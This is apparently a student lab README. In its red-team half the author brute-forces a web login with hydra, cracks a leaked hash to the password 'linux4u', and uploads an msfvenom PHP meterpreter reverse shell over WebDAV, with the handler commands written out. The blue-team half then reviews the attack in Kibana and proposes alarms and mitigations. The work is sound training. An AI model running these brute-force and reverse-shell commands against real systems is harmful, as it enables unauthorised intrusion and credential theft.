# Red-Team-VS-Blue-Team-Project
Acted as a red team to attack a vulnerable VM within my environment, ultimately gaining root access to the machine. Acted as Blue Team to use Kibana to review logs taken during the attack implemented as the red team.

 # Red Team
- <ins>Ifconfig</ins> to find out network IP address and network range ![ifconfig](https://user-images.githubusercontent.com/61332852/137389108-3288b38b-5fcd-497a-878f-206fe37f54f1.png)

- Netdiscover -r 192.168.1.255/16 Since we know the netmask is 255.255.255.0 that would be 16 bits of the subnet so then we can run the netdiscover command to discover other hosts on the network. ![netdiscover](https://user-images.githubusercontent.com/61332852/137389276-f4aca53a-40ea-41ac-a4b7-9ab04459d79a.png)

     - After running the command we can conclude that there are 3 hosts within the network with the IPs of 192.168.1.1 , 192.168.1.100 and 192.168.1.105.
     - Now we need to discover what machine we need to get access to 
- After checking up on the IPs we can conclude that 192.168.1.105 ended up being a web server.   
- After checking the website we see open directories that show company information showing that this is a vulnerability in itself.
 ![index](https://user-images.githubusercontent.com/61332852/137389410-4a1dec9f-30c7-4052-9a34-50fb89184500.png)
- And while exploring through the files we see an important directory being mentioned by the name of a secret_folder. Which can end up containing PII or important company documents. 
- After going in the URL bar and typing in the secret folder found 192.168.1.105/company_folders/secret_folder it then shows a login prompt meant for “Ashton” only. 

   ![ashton](https://user-images.githubusercontent.com/61332852/137389749-5b0f9dec-6d97-4d29-af2c-81b454318207.png)

- After getting a username for a potential login we can then try to brute force the login by using hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder command. 
![f2ef2a23bee60b46f58307ca124d2678](https://user-images.githubusercontent.com/61332852/137389842-76fca522-77e3-4a9d-9dac-ca31b880ea3e.png)
   - After using the command we successfully brute force the account and was able to retrieve the login information for ashton ![84d82a9a9e4648086a79b066c3362ec5](https://user-images.githubusercontent.com/61332852/137390073-bf6a0604-b024-4723-89a7-38e77bde1c13.png)

- Logging in the account then brings us to a personal note Ashton then made for himself containing other important information
 ![cc397b4dc2076647d79196d97e9632fe](https://user-images.githubusercontent.com/61332852/137390404-6b85bb05-ec5a-460e-a194-31611558d358.png) 
   - A note that hes going to be using Ryans account
   - After researching more on the web server we found that Ryan is the CEO of the company.
   - Hinting knowing that Ashton knows his login information with the hash giving at the top of the screen

- Next step is to figure out the login to the file directory dav://192.168.1.105/webdav/ using the hashed password at the top of Ashtons note. Using the website https://crackstation.net/  
   - Cracking the hash we find the password is linux4u
    ![ac297f568253612ff55d38fdf157547b](https://user-images.githubusercontent.com/61332852/137390969-4da74fb4-9592-4fd2-9844-2e22bc2a5865.png)

- Getting the login information to the company directory we know can exploit getting into the company system since the server has an open port 80 by creating a reverse shell script. The command being msf venom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > newshell.php

![b5607ffdbb52b0186be7de39a308e88a](https://user-images.githubusercontent.com/61332852/137391072-15001d7a-24ad-431d-9b67-cf39a58c789e.png)

- Once the reverse shell script is created we can now upload it to the shared directory to run it.
 ![4acac4ed99b11426e3e93855ce8a74f8](https://user-images.githubusercontent.com/61332852/137391146-79ec5c42-adaf-45bb-bfe1-25fd537ddadc.png)

- Before we run it we will want to run Metasploit to listen to the reverse shell on our host machine to access it remotely.
- The commands would be used in this order to begin the listening 
   - Msfconsole -q
   - Use exploit/multi/handler
   - Set payload php/meterpreter/reverse_tcp 
      - (same payload script as the one we copied to the shared directory)
   - Set LHOST 192.168.1.90
      - Ip of machine we want to listen on 
   - Set LPORT 4444
      - Port we want to listen on
   - Show options 
      - To see if all the settings we had set are correct
   - Run
      - To execute the listening process
 
 ![bc35031f4a1536c75c80faa31941456e](https://user-images.githubusercontent.com/61332852/137391217-c0c8f352-de04-4f7c-b3fb-5722b93771b1.png)


- Once this is completed we can now run the actual script through the shared directory dav://192.168.1.105/webdav which then after will then open up meterpreter on our host machine to show that we have now established connection 
![8316e2c4870b99011bd9c617fa3932fe](https://user-images.githubusercontent.com/61332852/137391273-63d35e21-d842-41fb-b658-6eb79a68052e.png)

   - After having the session open we can run basic commands to grab any other additional information about the system we got access to like getuid. We can also open up a shell terminal if needed by using the command shell.
- We can now run the command find -iname flag.txt to grab the flag we are looking for one the target machine.

 # Blue Team
- Analysis: Identifying the port scan
   - The port scan occurred on October 4th 2021 at 11:52PM
   - 254,496 packets were sent from the machine 192.168.1.90
   - Since there is such high network traffic when it should be idle it can be a sign of a port scan 
![85f85cd01314b79528146ba25e644eb1](https://user-images.githubusercontent.com/61332852/137392262-bab44589-0733-471d-a27c-2d3355f41d78.png)



- Analysis: Finding the Request for the hidden directory 
   - 19,227 requests were made to this URL path. This path was requested by the IP address of 192.168.1.90
   - The files that were requested had a hash that contained Ryan login credentials 
![c4273713c081053f537644eed454f141](https://user-images.githubusercontent.com/61332852/137392339-aba74b30-013d-4607-9dc1-e29d9dbfd67a.png)



- Analysis: uncovering the brute force attack
   - 19,227 requests was made during the brute force attack to access the secret folder directory
   - 16,101 requests were made before the password was used correctly
 ![e06114f629b2d5b8dd88724f3a6a59ac](https://user-images.githubusercontent.com/61332852/137392400-cc734f1b-c336-4f5a-9ec7-d629a092452f.png)


- Analysis: Finding the WebDAV Connection
   - 180,859 requests were made to this directory 
   - The files that were requested was the passwd file and also the php file used to initiate the reverse shell
![82ff51532e66b15c26075f0aa28127de](https://user-images.githubusercontent.com/61332852/137392456-7a4c8fc2-3a3e-4808-86be-c40ce0c5ca8f.png)


# Blue Team Proposed Alarms and Mitigation Strategies
- Blocking the Port Scan
  - Alarm
    - An alert to be sent to the team for a 1000+ port connections within a hour
  - System Hardening 
    - To run multiple port scans to see what ports are being opened and if any are being used maliciously
    - To make sure Firewall is up to date and to diminish any connections to the host

- Finding the Request for the Hidden Directory
  - Alarm
    - For an alert on the system to detect if certain files and directory within the system are being accessed without permission
    - If these private files and directories are trying to be accessed more than 3 times the alert would then be sent to the team
  - System Hardening
    - To encrypt sensitive data and for files to not be shared with users outside the company being in this situation.
    - To make a whitelist to people who can and cant use these files and directories

- Mitigation: Preventing Brute Force Attacks
  - Alarm
    - I would implement a failed login alert to show a certain amount of times the login has failed 
    - If the HTTP error code 401 is occurring multiple times an alert would be sent as well
    - If there is more than 5 failed login attempts the alarm would be triggered
  - System Hardening
    - a lock out after to many attempts of logging in to prevent a brute force attack like the one implemented
    - To require employees to have a complex password to mitigate the chances of getting a login attempt correctly

- Mitigation: Detecting the WebDav Connection
  - Alarm
    - An alert would be made to send the IP addresses trying to get access to webdav  
  - System Hardening
    - To whitelist certain IP addresses so only certain machines can access WebDav

- Mitigation: Identifying Reverse shell Uploads
  - Alarm
    - An alert can be shown when a file is being uploaded to the webdav folder and also the type of file being copied.
  - System Hardening
    - To mitigate the attack, permissions on the folder itself can be changed to read only so this prevents any malicious files being uploaded to the folder.
    - To whitelist IP addresses that can access the webdav folder 


